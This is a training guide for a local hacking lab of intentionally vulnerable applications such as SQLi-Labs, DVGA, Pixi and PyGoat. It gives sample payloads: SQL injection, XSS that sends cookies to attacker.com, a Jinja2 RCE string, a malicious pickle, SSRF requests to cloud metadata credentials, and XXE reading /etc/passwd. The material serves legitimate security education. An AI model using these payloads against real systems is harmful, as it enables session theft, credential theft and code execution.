# New Vulnerable Applications - Quick Guide

This guide provides quick start instructions for the newly added vulnerable applications in your hacking lab.

## Table of Contents
1. [OWASP VulnerableApp](#1-owasp-vulnerableapp)
2. [SQLi-Labs](#2-sqli-labs)
3. [Damn Vulnerable GraphQL Application](#3-damn-vulnerable-graphql-application)
4. [Damn Vulnerable RESTaurant API](#4-damn-vulnerable-restaurant-api)
5. [Pixi](#5-pixi)
6. [PyGoat](#6-pygoat)
7. [SSRF Lab](#7-ssrf-lab)
8. [VulnBank](#8-vulnbank)
9. [VulnLab](#9-vulnlab)
10. [OWASP WrongSecrets](#10-owasp-wrongsecrets)
11. [Yrprey](#11-yrprey)
12. [Zero Health](#12-zero-health)
13. [VulnAPI](#13-vulnapi)
14. [DVWS](#14-dvws)
15. [Hackazon](#15-hackazon)
16. [VulnShop](#16-vulnshop)

---

## 1. OWASP VulnerableApp

**URL**: http://localhost:8090
**Purpose**: Comprehensive web application with all OWASP Top 10 vulnerabilities

### Quick Start
```bash
# Access the application
open http://localhost:8090

# Common starting points:
- Registration and login bypass
- SQL Injection in search
- XSS in user profiles
- CSRF in password change
- File upload vulnerabilities
```

### Key Challenges
- **SQL Injection**: Multiple injection points in forms
- **Authentication**: Test login bypass techniques
- **Authorization**: Horizontal/vertical privilege escalation
- **File Upload**: Upload malicious files
- **XSS**: Stored and reflected XSS in multiple inputs

---

## 2. SQLi-Labs

**URL**: http://localhost:8091
**Purpose**: Dedicated SQL injection practice platform with 25+ scenarios

### Quick Start
```bash
# Access SQLi-Labs
open http://localhost:8091

# Setup (first time only):
- Click on "Setup/reset Database" to initialize

# Start with Lesson 1 ( Basics)
# Progress through challenges 1-25
```

### Lesson Categories
- **Lessons 1-10**: Basic SQL Injection (GET-based)
- **Lessons 11-15**: POST-based SQL Injection
- **Lessons 16-18**: Cookie/Header Injection
- **Lessons 19-20**: UPDATE/UPDATE query injection
- **Lessons 21-25**: Advanced techniques (盲注, 二次注入, etc.)

### Common Payloads
```sql
-- Basic
1' OR '1'='1

-- Union based
1' UNION SELECT 1,2,3--

-- Error based
1' AND 1=CAST((SELECT database())INTO int)--

-- Time based
1' AND SLEEP(5)--
```

---

## 3. Damn Vulnerable GraphQL Application

**URL**: http://localhost:8092
**Purpose**: Learn GraphQL-specific security vulnerabilities

### Quick Start
```bash
# Access DVGA
open http://localhost:8092

# Access GraphQL Playground at:
open http://localhost:8092/graphql

# Default credentials (if needed):
admin:password
```

### GraphQL Injection Points

#### Introspection
```graphql
# Reveal schema
{
  __schema {
    types {
      name
      fields {
        name
      }
    }
  }
}
```

#### Batching Attacks
```graphql
# Send multiple queries in single request
[
  {"query": "{user(id: 1){email}}"},
  {"query": "{user(id: 2){email}}"}
]
```

#### DoS via Nested Queries
```graphql
# Deeply nested query to cause DoS
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            email
          }
        }
      }
    }
  }
}
```

### Common Vulnerabilities
- GraphQL injection
- Authorization bypass
- Information disclosure via introspection
- Denial of Service (DoS)
- IDOR (Insecure Direct Object Reference)

---

## 4. Damn Vulnerable RESTaurant API

**URL**: http://localhost:8093
**Purpose**: REST API security testing platform

### Quick Start
```bash
# Access the API
curl http://localhost:8093/api/v1/health

# API Documentation usually at:
open http://localhost:8093/api-docs

# Or
open http://localhost:8093/swagger
```

### Common API Endpoints (Example)
```bash
# User registration
POST /api/v1/users/register
Content-Type: application/json
{
  "username": "testuser",
  "email": "test@example.com",
  "password": "password123"
}

# Login
POST /api/v1/users/login
{
  "username": "testuser",
  "password": "password123"
}

# Get menu (authentication required)
GET /api/v1/menu
Authorization: Bearer <token>

# Create order
POST /api/v1/orders
{
  "items": [1, 2, 3]
}
```

### Testing Areas
- Broken authentication
- JWT manipulation
- Rate limiting
- Mass assignment
- API key enumeration
- Parameter pollution
- CORS misconfiguration

---

## 5. Pixi

**URL**: http://localhost:8094
**Purpose**: Dedicated XSS (Cross-Site Scripting) practice platform

### Quick Start
```bash
# Access Pixi
open http://localhost:8094

# No authentication required
# Start with the first XSS challenge
```

### XSS Challenge Types

#### Reflected XSS
```javascript
// Test basic script injection
<script>alert('XSS')</script>

// Try different tags
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

#### Stored XSS
```javascript
// Store in profile, comment, or forum
<script>fetch('http://attacker.com/?c='+document.cookie)</script>

// More stealthy
<img src=x onerror="this.src='http://attacker.com/?c='+document.cookie">
```

#### DOM XSS
```javascript
// Test URL parameters
# Test input that gets written to DOM via innerHTML
```

### Advanced Techniques
- Bypassing filters (encoding, case variation)
- Context-specific payloads (HTML, attribute, JavaScript)
- Polyglot XSS
- XSS in modern frameworks

---

## 6. PyGoat

**URL**: http://localhost:8095
**Purpose**: Python web application vulnerabilities (Flask/Django)

### Quick Start
```bash
# Access PyGoat
open http://localhost:8095

# Python-specific vulnerabilities include:
- Template injection (SSTI/Jinja2)
- Python code injection
- Insecure deserialization (pickle)
- Format string vulnerabilities
```

### Server-Side Template Injection (SSTI)

#### Jinja2 (Flask)
```python
# Test payloads
{{7*7}}  # If you see 49, it's vulnerable
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}

# RCE payload
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}}
```

#### Django
```python
# Test Django template injection
{% debug %}
{% load i18n %}
```

### Python Pickle Deserialization
```python
# Create malicious pickle
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
# Send in session/cookie
```

---

## 7. SSRF Lab

**URL**: http://localhost:8096
**Purpose**: Practice Server-Side Request Forgery attacks

### Quick Start
```bash
# Access SSRF lab
open http://localhost:8096

# Look for features that fetch URLs:
- "Fetch from URL"
- "Import from URL"
- "Webhook tester"
- "File uploader via URL"
```

### Common SSRF Payloads

#### Internal Port Scanning
```
# Scan internal services
http://localhost:3306
http://localhost:6379
http://169.254.169.254/latest/meta-data/  # AWS metadata
http://metadata.google.internal  # GCP metadata
```

#### File Protocol
```
# Read local files (if file:// allowed)
file:///etc/passwd
file://localhost/etc/passwd
```

#### Blind SSRF
```bash
# Setup listener
nc -lvnp 80

# Try to trigger request to your server
http://attacker.com:80/

# Or use out-of-band techniques
http://<your-burp-collaborator-url>
```

### Cloud Metadata Exploitation
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/
```

---

## 8. VulnBank

**URL**: http://localhost:8097
**Purpose**: Vulnerable banking application for business logic testing

### Quick Start
```bash
# Access VulnBank
open http://localhost:8097

# Register a new account
# Practice banking-related vulnerabilities
```

### Common Banking Vulnerabilities

#### Price Manipulation
```bash
# Modify order amount in requests
# Change prices in API calls
# Manipulate transaction amounts
```

#### Race Conditions (One-Time Use)
```bash
# Send multiple simultaneous requests
# Use same coupon/twice
# Double-spend vulnerabilities
```

#### IDOR in Financial Operations
```bash
# Modify account numbers in transfers
# Access other users' accounts
# Modify transaction IDs
```

#### Integer Overflow
```bash
# Large amount calculations
# Negative balance exploitation
```

---

## 9. VulnLab

**URL**: http://localhost:8098
**Purpose**: Multiple web vulnerabilities in one application

### Quick Start
```bash
# Access VulnLab
open http://localhost:8098

# Explore the application
# Look for common vulnerabilities
```

### Typical Vulnerabilities
- SQL Injection
- XSS (Reflected/Stored)
- Command Injection
- File Upload
- Authentication Bypass
- Insecure Direct Object Reference
- XXE (XML External Entity)

---

## 10. OWASP WrongSecrets

**URL**: http://localhost:8099
**Purpose**: Learn secrets management vulnerabilities

### Quick Start
```bash
# Access WrongSecrets
open http://localhost:8099

# Challenge categories:
1. Hardcoded secrets
2. Secrets in git history
3. Secrets in environment variables
4. Secrets in config files
5. Kubernetes secrets
```

### Common Challenges

#### Challenge 1: Hardcoded Password
```javascript
// Check JavaScript files for hardcoded secrets
// View page source
// Use Burp Suite to inspect all resources
```

#### Challenge 2: Git History
```bash
# If you can access .git
git log
git diff
git show
```

#### Environment Variables
```javascript
// Check endpoints that leak env vars
// Error messages sometimes leak secrets
// Debug endpoints
```

### Tools for Finding Secrets
```bash
# TruffleHog
trufflehog filesystem /path/to/app

# Git-Dumper
git-dumper http://localhost:8099/.git output

# Secret scanning
gitleaks detect --source /path/to/repo
```

---

## 11. Yrprey

**URL**: http://localhost:8100
**Purpose**: Phishing and social engineering simulation platform

### Quick Start
```bash
# Access Yrprey
open http://localhost:8100

# Educational phishing simulation
# Learn to identify phishing indicators
```

### Learning Areas
- Email spoofing techniques
- Clone phishing
- Credential harvesting
- Social engineering tactics
- Business Email Compromise (BEC) simulation

---

## 12. Zero Health

**URL**: http://localhost:8101
**Purpose**: Healthcare application with medical data vulnerabilities

### Quick Start
```bash
# Access Zero Health
open http://localhost:8101

# Healthcare-specific vulnerabilities:
- Patient data exposure
- Medical record manipulation
- Prescription fraud
- HIPAA violations simulation
```

### Key Testing Areas
- Patient IDOR (access other patients' records)
- Medical history manipulation
- Prescription forging
- Insurance fraud
- Sensitive data exposure

---

## 13. VulnAPI

**URL**: http://localhost:8102
**Purpose**: REST API vulnerability testing

### Quick Start
```bash
# Access VulnAPI
curl http://localhost:8102/api/v1/

# API testing with tools:
- Postman
- Burp Suite
- curl
- OWASP ZAP
```

### API Security Testing Checklist
```bash
# 1. Authentication testing
# 2. Authorization testing
# 3. Input validation
# 4. Rate limiting
# 5. API key management
# 6. CORS configuration
# 7. Error handling
# 8. Mass assignment
```

---

## 14. DVWS (Damn Vulnerable Web Services)

**URL**: http://localhost:8103
**Purpose**: Web Services vulnerabilities (SOAP/XML)

### Quick Start
```bash
# Access DVWS
open http://localhost:8103

# Web services vulnerabilities:
- XXE (XML External Entity)
- SOAP injection
- WSDL enumeration
- XML attacks
```

### XXE Payloads
```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-server/">]>
```

---

## 15. Hackazon

**URL**: http://localhost:8104
**Purpose**: Vulnerable e-commerce platform

### Quick Start
```bash
# Access Hackazon
open http://localhost:8104

# E-commerce vulnerabilities:
- Shopping cart manipulation
- Payment bypass
- Coupon abuse
- User privilege escalation
- Order manipulation
```

### Common Vulnerabilities

#### Price Manipulation
```bash
# Intercept and modify prices in checkout
# Change product prices in API
# Modify shipping costs
```

#### Coupon Abuse
```bash
# Reuse single-use coupons
# Stack multiple discounts
# Modify coupon values
```

#### Payment Flow Bypass
```bash
# Skip payment steps
# Modify transaction amounts
# Free shipping exploitation
```

---

## 16. VulnShop

**URL**: http://localhost:8106
**Purpose**: Business logic flaws in e-commerce

### Quick Start
```bash
# Access VulnShop
open http://localhost:8106

# Focus on business logic:
- Negative quantity
- Integer overflow
- Currency manipulation
- Race conditions in checkout
```

### Business Logic Flaws

#### Negative Quantity
```bash
# Order negative quantities
# Result: Money added to account
```

#### Currency Manipulation
```bash
# Change currency codes
# Exploit conversion rates
```

#### Race Conditions
```bash
# Simultaneous checkout requests
# Inventory manipulation
```

---

## Testing Workflow

### Step 1: Reconnaissance
```bash
# Identify running applications
./lab.sh urls

# Port scan
nmap -sV localhost
```

### Step 2: Automated Scanning
```bash
# Run Nikto on web apps
nikto -h http://localhost:8090

# Directory brute-forcing
gobuster dir -u http://localhost:8090 -w /usr/share/wordlists/dirb/common.txt
```

### Step 3: Manual Testing
```bash
# Test authentication
# Test input validation
# Test API endpoints
# Test for common OWASP Top 10
```

### Step 4: Documentation
```bash
# Document findings
# Create screenshots
# Write proof-of-concept exploits
```

---

## Tips for Success

1. **Start Simple**: Begin with low-hanging fruit
2. **Understand the App**: Know normal functionality before exploiting
3. **Use Multiple Tools**: Combine automated and manual testing
4. **Read Documentation**: Each app has specific challenges
5. **Learn from Mistakes**: Note what doesn't work
6. **Build Methodology**: Develop systematic testing approach

---

## Quick Reference Card

```bash
# All New Services
8090 - OWASP VulnerableApp (All OWASP Top 10)
8091 - SQLi-Labs (SQL Injection mastery)
8092 - DVGA (GraphQL security)
8093 - DV Restaurant (REST API)
8094 - Pixi (XSS practice)
8095 - PyGoat (Python vulnerabilities)
8096 - SSRF Lab (Server-Side Request Forgery)
8097 - VulnBank (Banking app logic flaws)
8098 - VulnLab (Multiple vulns)
8099 - WrongSecrets (Secrets management)
8100 - Yrprey (Phishing simulation)
8101 - Zero Health (Healthcare app)
8102 - VulnAPI (REST API testing)
8103 - DVWS (Web Services/SOAP)
8104 - Hackazon (E-commerce)
8105 - Padding Oracle (Crypto attacks)
8106 - VulnShop (Business logic)
```

---

Happy learning and ethical hacking!
